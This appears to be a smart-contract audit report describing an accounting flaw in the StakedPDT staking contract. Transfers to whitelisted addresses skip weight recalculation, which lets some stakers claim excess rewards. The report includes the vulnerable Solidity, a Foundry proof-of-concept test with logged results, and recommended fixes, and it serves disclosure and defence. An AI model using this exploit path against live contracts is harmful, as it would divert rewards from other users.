## Description
The `transfer` and `transferFrom` functions allow users to transfer their `StakedPDT` tokens
to whitelisted addresses. However, transfering staked tokens can break the reward and
weight calculation.

## Vulnerability Details
The `transfer` and `transferFrom` functions allow a user to send their `StakedPDT` token to
another address, however these functions do not calculate the user weight
```solidity
function transfer(address to, uint256 value) public override returns (bool) {
    if (!whitelistedContracts[to]) revert InvalidStakesTransfer();
    super._transfer(msg.sender, to, value);
    return true;
}

function transferFrom(address from, address to, uint256 value) public override returns (bool) {
    if (!whitelistedContracts[to]) revert InvalidStakesTransfer();
    super._spendAllowance(from, msg.sender, value);
    super._transfer(msg.sender, to, value);
    return true;
}
```
Consider a scenario where a user has staked at the end of an epoch, their weight is
adjusted for the fact that they have staked late and their rewards will be calculated with
their weight compared to the contract weight.
```solidity
function stake(address to, uint256 amount) external nonReentrant {
    //rest of the function
    StakeDetails memory _stake = stakeDetails[to];
    uint256 _amountStaked = balanceOf(to);
    if (_stake.lastInteraction > _epoch.startTime) {
        uint256 _additionalWeight =
            _weightIncreaseSinceInteraction(block.timestamp, _stake.lastInteraction, _amountStaked);
        _stake.weightAtLastInteraction += _additionalWeight;
    } else {
        _stake.weightAtLastInteraction =
            _weightIncreaseSinceInteraction(block.timestamp, _epoch.startTime, _amountStaked);
    }
    //rest of the function
} 
```
However, when tokens are transferred, the `transfer` function does not consider what the
user weight was. When a user receives tokens, their weight will not be calculated
correctly while the contract weight is calculated correctly. This will result in combined
user weights being more than the contract weight which means that users that claim
rst will benefit from more rewards while there won’t be enough rewards left for users
that claim later.

## Proof of Concept
Implement and run the following test in the `StakedPDT_claim.t.sol` file.
```solidity
function test_transferTokenAndClaim() public {
    uint256 POOL_SIZE = 1e18;
    uint256 initialBalance = 1e18;
    bPDTOFT.mint(staker1, initialBalance * 2);
    bPDTOFT.mint(staker2, initialBalance * 2);
    bPDTOFT.mint(staker3, initialBalance * 2);
    bPDTOFT.mint(staker4, initialBalance * 2);
    //update staker2 as whitelisted
    vm.startPrank(tokenManager);
    bStakedPDT.updateWhitelistedContract(staker2, true);
    vm.stopPrank();
    //advance to epoch1
    _creditPRIMERewardPool(POOL_SIZE);
    _moveToNextEpoch(0);
    //advance to epoch2
    _creditPRIMERewardPool(POOL_SIZE);
    _moveToNextEpoch(1);
    //staker3 and staker4 stake at epoch2 start
    (uint256 epochStartTime, uint256 epochEndTime,) = bStakedPDT.epoch(2);
    vm.warp(epochStartTime);
    vm.startPrank(staker3);
    bPDTOFT.approve(bStakedPDTAddress, initialBalance * 2);
    bStakedPDT.stake(staker3, initialBalance);
    vm.stopPrank();
    vm.startPrank(staker4);
    bPDTOFT.approve(bStakedPDTAddress, initialBalance * 2);
    bStakedPDT.stake(staker4, initialBalance);
    vm.stopPrank();
    //staker1 stakes right before epoch end
    vm.warp(epochEndTime - 1 days);
    vm.startPrank(staker1);
    bPDTOFT.approve(bStakedPDTAddress, initialBalance * 2);
    bStakedPDT.stake(staker1, initialBalance);
    vm.stopPrank();
    //staker1 transfers StakedPDT to staker2
    vm.startPrank(staker1);
    bStakedPDT.transfer(staker2, initialBalance);
    vm.stopPrank();
    console.log("Contract weight:", bStakedPDT.contractWeight());
    console.log("Staker1 weight:", bStakedPDT.userTotalWeight(staker1));
    console.log("Staker2 weight:", bStakedPDT.userTotalWeight(staker2));
    console.log("Staker3 weight:", bStakedPDT.userTotalWeight(staker3));
    console.log("Staker4 weight:", bStakedPDT.userTotalWeight(staker4));
    //advance to epoch3
    _creditPRIMERewardPool(POOL_SIZE);
    _moveToNextEpoch(2);
    //all stakers claim
    vm.startPrank(staker1);
    bStakedPDT.claim(staker1);
    vm.stopPrank();
    vm.startPrank(staker2);
    bStakedPDT.claim(staker2);
    vm.stopPrank();
    vm.startPrank(staker3);
    bStakedPDT.claim(staker3);
    vm.stopPrank();
    vm.startPrank(staker4);
    bStakedPDT.claim(staker4);
    vm.stopPrank();
    //logs
    console.log("Staker1 PRIME Reward Tokens:", bPRIME.balanceOf(staker1));
    console.log("Staker2 PRIME Reward Tokens:", bPRIME.balanceOf(staker2));
    console.log("Staker3 PRIME Reward Tokens:", bPRIME.balanceOf(staker3));
    console.log("Staker4 PRIME Reward Tokens:", bPRIME.balanceOf(staker4));
}
```
Observing the logs shown below will show that the combined user weight is greater
than the contract weight and that staker4 does not receive the rewards that they are
entitled to.
```typescript
Contract weight: 54000000000000000000
Staker1 weight: 0
Staker2 weight: 27000000000000000000
Staker3 weight: 27000000000000000000
Staker4 weight: 27000000000000000000
Staker1 PRIME Reward Tokens: 0
Staker2 PRIME Reward Tokens: 491228070175438596
Staker3 PRIME Reward Tokens: 491228070175438596
Staker4 PRIME Reward Tokens: 17543859649122808
```

## Impact
Reward and weight calculation breaks, users will miss out on rewards they should get
while other users will earn rewards that they shouldn’t.

## Recommendation
Calculate the user weight on token transfers. When a user receives tokens, their weight
should be adjusted according to the weight of the token sender.

Alternatively, remove the transfer functionalities
